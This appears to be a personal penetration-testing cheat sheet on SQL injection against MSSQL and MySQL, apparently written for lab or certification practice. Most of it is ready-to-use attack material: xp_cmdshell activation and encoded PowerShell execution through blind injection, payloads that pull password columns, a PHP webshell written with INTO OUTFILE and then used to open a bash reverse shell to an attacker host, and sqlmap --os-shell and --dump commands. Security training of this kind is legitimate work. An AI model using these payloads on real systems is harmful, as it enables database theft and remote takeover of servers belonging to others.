# SQLi

URL encoding: https://www.urlencoder.io/

## MSSQL 

### Basics

#### Connection

User account: `Administrator`
```
kali$ impacket-mssqlclient $SomeUserAccount:$somepass@$TargetIp -windows-auth
```

#### Commands

Known table `master.sys.sysusers`: https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysusers-transact-sql?view=sql-server-ver16
```
SQL> SELECT @@version;
SQL> SELECT name FROM sys.databases;
SQL> SELECT * FROM somedatabasename.information_schema.tables; # tables of the "somedatabasename" db, together with their schema
SQL> SELECT * FROM somedatabasename.someschema.sometablename; # table name of interest: "users"

SQL> select * from master.information_schema.tables;
SQL> select top 2 * from master.dbo.sysusers; # table "sysusers" is an alias /!\; top 2 lines
```

### Attacks

#### Principle

Function `xp_cmdshell` needs to be activated:
- usage: https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15
- enabling: https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver15

Example "locally":
```
kali$ impacket-mssqlclient Administrator:thelocaladminpass@$TargetIp -windows-auth
SQL> execute sp_configure 'show advanced options', 1;
SQL> reconfigure;
SQL> execute sp_configure 'xp_cmdshell';
SQL> reconfigure;
SQL> execute xp_cmdshell 'whoami';
```
and URL encoded:
```
execute%20sp_configure%20%27show%20advanced%20options%27%2C%201%3B
reconfigure%3B
execute%20sp_configure%20%27xp_cmdshell%27%3B
reconfigure%3B
execute%20xp_cmdshell%20%27whoami%27%3B
```

#### In blind mode

Once identified a vulnerable input field (ALWAYS url encoded):
```
curl http://sitetohack.com/someform.php?vulnparam=somevalue%20'%20execute%20sp_configure%20...%3b--
curl http://sitetohack.com/someform.php?vulnparam=somevalue%20'%20reconfigure%3b--
...
curl http://sitetohack.com/someform.php?vulnparam=somevalue%20'%20execute%20xp_cmdshell%20'powershell%20-enc%20some_long_base64_string_url_encoded'%3b--
```
and listen with nc: `nc -lnvp $some_port_as_in_the_base64_long_string`.

Or sqlmap...

## MySQL

### Basics

#### Connection
```
$ mysql -u root -p'rootpassword' -h $DbServerIp -P $DbServerPort
```

#### Commands
```
> select version();
> select system_user();
> show databases;
> use databasetohack;
> select table_name from information_schema.tables;
> select table_name, table_schema from information_schema.tables where table_schema = 'databasetohack';
> select table_name, table_schema from information_schema.tables where table_schema = database(); # current db in use
> select column_name from information_schema.columns where table_name = 'tablenamewithusers' ;

> SELECT user, authentication_string, plugin FROM mysql.user WHERE user = 'usertohack';
```

### Attacks

#### Error-based payloads

Php mysqli queries (stands for MySQL Improved): https://www.php.net/manual/en/mysqli.query.php

Vulnerable Php query:
```
<?php
$uname = $_POST['uname'];
$passwd =$_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>
```

Injections:
```
someuser ' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' or 1=1 in (select version()) -- //
' or 1=1 in (select * from user_table) -- //
' or 1=1 in (select password_column from user_table) -- //
' or 1=1 in (select password_column from user_table where username_column = 'admin') -- //
```

#### Union select

Regular `UNION SELECT`: https://www.mysqltutorial.org/sql-union-mysql.aspx

Vulnerable Php query:
```
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

Injection:
```
' order by 1,2,3 -- //
%' union select database(), user(), @@version, null, null -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
' union select null, username, password, description, null from users -- //
```
gives:
```
SELECT * from customers WHERE name LIKE '' order by 1,2,3 -- //'";
SELECT * from customers WHERE name LIKE '%' union select database(), user(), @@version, null, null -- //'";
SELECT * from customers WHERE name LIKE '' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
The `order by` injection retrieves the table size, then simple `UNION SELECT` test:
```
' union select '1', '2', '3', '4', '5', '6', ... -- //
```

#### Blind injections

Boolean-based, the fake user query gives an empty output:
```
http://$TargetIp/blindsqli.php?user=trueuser' AND 1=1 -- //
http://$TargetIp/blindsqli.php?user=fakeuser' AND 1=1 -- //
```

Time-based, the fake user response is immediate (time consuming):
```
http://$TargetIp/blindsqli.php?user=trueuser' AND IF (1=1, sleep(3),'false') -- //
http://$TargetIp/blindsqli.php?user=fakeuser' AND IF (1=1, sleep(3),'false') -- //
```

#### Php injection - OS command

Php injection in an `input` HTML field:
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, ..., null INTO OUTFILE "/path/on/target/webshell.php" -- //
```
and trigger the webshell:
```
curl $TargetIp/path/on/target/webshell.php?cmd=ls
curl $TargetIp/path/on/target/webshell.php?cmd=id
curl $TargetIp/path/on/target/webshell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$AttackerIp%2F$AttackerPort%200%3E%261%22
```

## Sqlmap

https://sqlmap.org/

Test for vulnerabilities and dump the database:
```
sqlmap -u http://ip/page.php?user=dummy -p user
sqlmap -u http://ip/page.php?user=dummy -p user --dump # time consuming
```

Intercept a `UNION SELECT` in Burp and record the `POST` as a file. Then use sqlmap to get a webshell:
```
sqlmap -r post_request_saved_as_a_file.txt -p some_input_parameter_in_the_post_request --os-shell --web-root "/var/www/html/tmp"
```

## CVE examples

- WordPress plugin Perfect Survey: https://sploitus.com/exploit?id=WPEX-ID:C1620905-7C31-4E62-80F5-1D9635BE11AD
- PostGreSQL RCE: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#cve-20199193

